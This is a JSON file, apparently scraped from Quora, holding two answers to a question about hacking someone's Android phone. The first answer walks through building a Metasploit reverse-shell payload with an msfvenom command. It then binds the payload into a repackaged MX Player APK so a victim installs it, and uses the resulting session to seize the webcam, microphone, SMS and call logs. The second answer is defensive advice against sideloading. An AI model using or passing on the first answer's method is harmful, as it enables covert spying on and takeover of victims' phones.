@@ -1,0 +1,49 @@
+{
+    "title": "Can somebody hack in your Android smartphone from another device? - Quora",
+    "tags": [
+        "Computer Hacking (security)",
+        "Android (operating system)"
+    ],
+    "response": [
+        {
+            "author_info": {
+                "name": "Aniket Tikalkar",
+                "href": "/profile/Aniket-Tikalkar"
+            },
+            "answer_text": "yes this is possible,you will require kali linux, a router,an apk file you can create a simple payload in kali linux using the msfvenom command it looks something like >msfvenom -p android/meterpreter/reverse_tcp lhost=\u201dyour ip\u201d lport=\u201dany port not in use like 4467\u201d -o payload.apk now the next step would be to bind the payload apk to an existing apk so the victim installs the file, you will need to download an apk file first lets say you downloaded the apk file for mxplayer, you need to decompile payload.apk and mxplayer.apk using the command >apktool d mxplayer.apk >apktool d payload.apk this will create two directories,you need to copy the permissions of payload.apk to mxplayer.apk ,this can be done by editing the androidManifest.xml file in the directories, now you want the payload to run as soon as the victim clicks on mxplayer, this can be achieved by looking for launch intent , and editing the corresponding file so that a reverse metasploit session is created . next you need the jarsigner and keytool to sign the file and then recompile it. so far you have just created a payload, you need to do portforwarding in order to gain remote access i.e gain control over internet, this can be done by changing your router settings. next you need a running meterpreter session , this can be achieved by running metasploit you can control webcam,microphone,get call logs, get sms dumps, send messages through the victims phone,start anactivity on victims phone like play a youtube video etc. this answer is an overview, actually every step is detailed, this answer has the key terms you can google them to try it on your own . ",
+            "date": "Answered July 17, 2017",
+            "views": "696",
+            "upvotes": " View 2 Upvoters ",
+            "upvoters": [
+                {
+                    "user_id": "Mohammed Zaid",
+                    "user_href": "/profile/Mohammed-Zaid-66"
+                },
+                {
+                    "user_id": "Chinmay Chhajed",
+                    "user_href": "/profile/Chinmay-Chhajed"
+                }
+            ]
+        },
+        {
+            "author_info": {
+                "name": "Altu\u011f G\u00fcr",
+                "href": "/profile/Altu\u011f-G\u00fcr"
+            },
+            "answer_text": "While doing this is not very easy, it is still possible. Especially if you have been lured into sideloading a malware app that was disguised as a nice, free and marvelous app (which may still act like one) but contains code that will help someone to hack your device. When you execute such a code, the hacker may do whatever your Android OS version allows a particular app to do. That's why, unless you know exactly what you're doing, sideloading apps or using app stores other than Google Play is a very bad idea. Because each and every app submitted to play store is analyzed by experts and only if they pass the quality tests they get published. Also, you have a chance to check which permissions an app requires before installing it and decide against it if you don't feel comfortable.  So don't be lured into honey traps of awesome free apps somewhere on the net (if they were nice, they would be in Google Play) and don't be fooled into clicking obscure links that arrive via sms, email or through another messaging app. Last but not least, beware of scam warnings (especially found in free music/movie/photo download sites) that pops up and says \"your device is infected! Click here to clean!\" They usually make your device sound and vibrate to make you panic. It's a trap! Just close the browser tab and they'll go away (back button usually doesn't work). Long story short, be smarter than your phone and master it. ",
+            "date": "Answered March 28, 2016",
+            "views": "17",
+            "upvotes": " View 2 Upvoters",
+            "upvoters": [
+                {
+                    "user_id": "Richard Shatz",
+                    "user_href": "/profile/Richard-Shatz"
+                },
+                {
+                    "user_id": "Rocky Stones",
+                    "user_href": "/profile/Rocky-Stones-1"
+                }
+            ]
+        }
+    ]
+}
